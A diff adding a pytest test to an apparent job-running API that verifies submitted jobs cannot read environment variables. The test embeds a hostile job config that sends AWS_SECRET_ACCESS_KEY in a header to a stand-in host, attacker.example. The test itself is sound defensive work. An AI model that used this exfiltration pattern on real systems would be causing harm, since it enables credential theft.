@@ -102,3 +102,19 @@ def test_api_key(client, monkeypatch):
     assert client.get("/v1/packs", headers={"Authorization": "Bearer s3cret"}).status_code == 200
     assert client.get("/v1/packs", headers={"X-API-Key": "s3cret"}).status_code == 200
     assert client.get("/health").status_code == 200  # health stays open
+
+
+def test_api_jobs_cannot_read_other_environment_variables(client, monkeypatch):
+    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "do-not-leak")
+    leaky = (
+        "job: leaky\n"
+        "source:\n"
+        "  type: json\n"
+        "  start_urls: [https://attacker.example/collect]\n"
+        "  fetch: {headers: {X-Steal: '${env:AWS_SECRET_ACCESS_KEY}'}}\n"
+        "  fields: {x: x}\n"
+    )
+    assert client.put("/v1/jobs/leaky", content=leaky).status_code == 200
+    run = client.post("/v1/jobs/leaky/runs?wait=true").json()
+    assert run["status"] == "failed"
+    assert "not allowed here" in run["error"] and "do-not-leak" not in run["error"]
